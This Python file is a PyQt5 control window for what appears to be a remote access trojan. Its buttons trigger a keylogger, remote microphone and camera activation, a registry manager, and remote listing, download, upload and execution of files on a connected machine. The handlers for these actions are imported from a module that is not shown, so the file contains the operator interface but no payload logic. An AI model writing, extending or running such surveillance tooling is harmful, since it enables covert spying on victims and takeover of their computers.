# -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtWidgets
from Ui_client import *
import asyncio
import qasync
import ctypes
from operation_modules import *


class Client(Ui_ClientMainWindow, QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
            "myappid")

        self.keylogger.clicked.connect(self.keyloggerClicked)
        self.openMicrophone.clicked.connect(self.openMicrophoneClicked)
        self.openCamera.clicked.connect(self.openCameraClicked)
        self.Connect.clicked.connect(self.connect)
        self.disConnect.clicked.connect(self.disconnect)
        self.fileList.clicked.connect(
            lambda: self.fileManagerClicked("fileList"))
        self.fileDownload.clicked.connect(
            lambda: self.fileManagerClicked("fileDownload"))
        self.fileUpload.clicked.connect(
            lambda: self.fileManagerClicked("fileUpload"))
        self.fileExcute.clicked.connect(
            lambda: self.fileManagerClicked("fileExcute"))

        self.connections = {
            'fileManager': {'reader': None, 'writer': None},
            'regManager': {'reader': None, 'writer': None},
            'openCamera': {'reader': None, 'writer': None},
            'openMicrophone': {'reader': None, 'writer': None},
            'keylogger': {'reader': None, 'writer': None}
        }

    def append_log(self, message):
        QtCore.QMetaObject.invokeMethod(
            self.textBrowser, "append", QtCore.Q_ARG(str, message))

    def connect(self):
        loop = asyncio.get_event_loop()
        loop.create_task(connected(self))

    def disconnect(self):
        loop = asyncio.get_event_loop()
        loop.create_task(disconnected(self))

    def fileManagerClicked(self, operation):
        loop = asyncio.get_event_loop()
        loop.create_task(fileManager(self, operation))

    def regManagerClicked(self):
        loop = asyncio.get_event_loop()
        loop.create_task(regmanager(self))

    def keyloggerClicked(self):
        loop = asyncio.get_event_loop()
        loop.create_task(keylogger(self))

    def openCameraClicked(self):
        loop = asyncio.get_event_loop()
        loop.create_task(opencamera(self))

    def openMicrophoneClicked(self):
        loop = asyncio.get_event_loop()
        loop.create_task(openmicrophone(self))


if __name__ == "__main__":
    import sys
    from PyQt5.QtWidgets import QApplication

    QApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling)

    app = QApplication(sys.argv)

    client = Client()
    client.show()

    loop = qasync.QEventLoop(app)
    asyncio.set_event_loop(loop)
    with loop:
        loop.run_forever()
